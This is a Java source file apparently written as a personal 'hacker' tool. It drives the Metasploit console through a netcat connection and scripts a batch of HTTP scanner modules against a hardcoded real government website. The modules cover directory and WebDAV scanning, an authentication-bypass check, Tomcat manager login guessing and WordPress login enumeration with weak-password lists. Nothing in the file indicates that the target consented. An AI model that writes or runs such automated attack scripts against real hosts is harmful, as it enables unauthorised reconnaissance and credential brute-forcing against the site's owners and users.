package com.mtx.xiatian.hacker;

import java.io.OutputStream;

/**
 * 渗透测试框架
 * @author xiatian
 *
 */
public class Metasploit extends CommonTools
{
	

	/**
	 * @param out 接受命令输出
	 * @param cmdInput 交互命令输入
	 * @param arg 命令参数
	 */
	public  OutputStream getCmdResult(OutputStream out,  String... arg)
	{
		Process p = null;
		OutputStream outCmd = null;
		try
		{
			Runtime rt = Runtime.getRuntime();
			// rt.
			p = rt.exec(arg);
			
			// 正常命令输出
			new Thread(new MetasploitRest(p.getInputStream(), out)).start();
			// 错误消息
			new Thread(new MetasploitRest(p.getErrorStream(), out)).start();
			p.waitFor();
			outCmd = p.getOutputStream();
			System.out.println("Ok");
		} catch (Exception e)
		{
			e.printStackTrace();
		} finally
		{
//			
//			try
//			{
//				if (null != out)
//				{
//					out.close();
//				}
//			} catch (Exception e)
//			{
//				e.printStackTrace();
//			}
			if (null != p)
				p.destroy();
		}
		return outCmd;
	}

	/**
	 * @param args
	 */
	public static void main(String[] args)
	{
		String server = "www.gdjy.hrss.gov.cn";
		String port = "80";
		OutputStream out = System.out;
		// /bin/stty raw -echo <&2
		//  bin/stty raw -echo
		// stty cbreak -echo <&2
		// stty: stdin isn't a terminal
		OutputStream cmdInput = // System.out;
				new Metasploit().getCmdResult(out, 
						"/usr/bin/nc",
						"127.0.0.1",
						"55554"
//						"/Users/xiatian/.rvm/rubies/ruby-2.1.6/bin/ruby",
//						"/opt/metasploit-framework/bin/msfconsole"
						);
		String []md = {
				"use auxiliary/scanner/http/cert",
				"use auxiliary/scanner/http/dir_listing",
				"use auxiliary/scanner/http/dir_scanner",
				"use auxiliary/scanner/http/dir_webdav_unicode_bypass",
				"use auxiliary/scanner/http/enum_delicious",
				"use auxiliary/scanner/http/enum_wayback",
				"use auxiliary/scanner/http/files_dir",
				"use auxiliary/scanner/http/http_login",
				"use auxiliary/scanner/http/open_proxy",
				"use auxiliary/scanner/http/options",
				"use auxiliary/scanner/http/robots_txt",
				"use auxiliary/scanner/http/ssl",
				"use auxiliary/scanner/http/http_version",
				"use auxiliary/scanner/http/tomcat_mgr_login",
				"use auxiliary/scanner/http/verb_auth_bypass",
				"use auxiliary/scanner/http/webdav_scanner",
				"use auxiliary/scanner/http/webdav_website_content",
				/**<pre>
				 * 弱口令扫描
				 * set URI /wordpress/wp-login.php
				 * set PASS_FILE /tmp/passes.txt
				 * set USER_FILE /tmp/users.txt
				 * </pre>
				 */
				"use auxiliary/scanner/http/wordpress_login_enum"
				};
		String []a =
			{
				"set RHOSTS " + server,
				"set THREADS 25",
				"set DOMAIN " + server,
//				"set VERBOSE false",
				"set RPORT " + port,
				"run",
				"back"
			};
		try
		{
			cmdInput.write("workspace gszb\r\n".getBytes());
			for (String mdT : md)
			{
				cmdInput.write((mdT + "\r\n").getBytes());
				for (String mdTn : a)
				{
					cmdInput.write((mdTn + "\r\n").getBytes());
				}
			}
			cmdInput.write("exit\r\n".getBytes());
//			cmdInput.flush();
			cmdInput.close();
		} catch (Exception e)
		{
			e.printStackTrace();
		}
	}

}
